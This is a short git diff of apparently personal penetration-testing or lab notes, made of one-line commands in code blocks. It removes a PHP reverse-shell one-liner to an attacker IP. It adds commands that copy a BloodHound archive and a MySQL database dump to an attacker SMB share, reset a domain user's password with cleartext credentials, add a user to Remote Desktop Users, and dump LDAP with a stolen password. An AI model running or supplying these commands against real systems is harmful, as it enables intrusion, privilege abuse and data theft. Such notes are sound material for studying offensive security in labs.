@@ -9,23 +9,24 @@ feroxbuster -u http://192.168.245.170/ -w /usr/share/seclists/Discovery/Web-Cont
 ```
 
 ```
-php -r '$sock=fsockopen("192.168.45.186",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+copy C:\Windows\Tasks\20261118191035_BloodHound.zip \\192.168.45.186\share\
 ```
 
 ```
-
+net rpc password mario.lemieux 'Password123!' -U 'DC01.feast.com/'jeff.borrows'%'naruto' -S 192.168.245.169
 ```
 
 ```
-
+net use \\192.168.45.186\share /user:kali kali
+copy C:\xampp\mysql\share\mysql_test_db.sql \\192.168.45.186\share\
 ```
 
 ```
-
+net group "Remote Desktop Users" Retric /add /domain
 ```
 
 ```
-
+ldapsearch -H ldap://${ip} -b "DC=BLACKFIELD,DC=local" -D 'support@blackfield.local' -w '#00^BlackKnight' > support_ldap_dump
 ```
 
 ```
